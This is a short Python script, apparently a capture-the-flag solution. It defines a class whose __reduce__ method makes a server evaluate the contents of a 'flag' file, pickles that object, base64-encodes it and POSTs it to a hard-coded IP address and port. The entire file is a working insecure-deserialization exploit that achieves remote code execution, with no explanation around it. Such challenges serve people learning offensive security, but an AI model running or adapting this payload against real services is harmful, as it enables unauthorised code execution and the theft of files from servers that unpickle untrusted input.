import pickle
import pwn
import requests
import base64


class Exploit(object):
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

def sendPayload(p):
	newp = base64.urlsafe_b64encode(p).decode()
	headers = {'Content-Type': 'application/yakoo'}
	r = requests.post("http://35.242.253.155:30788/",headers=headers,data=newp)
	return r.text


payload_dec = pickle.dumps(Exploit(), protocol=2)
print(sendPayload(payload_dec))
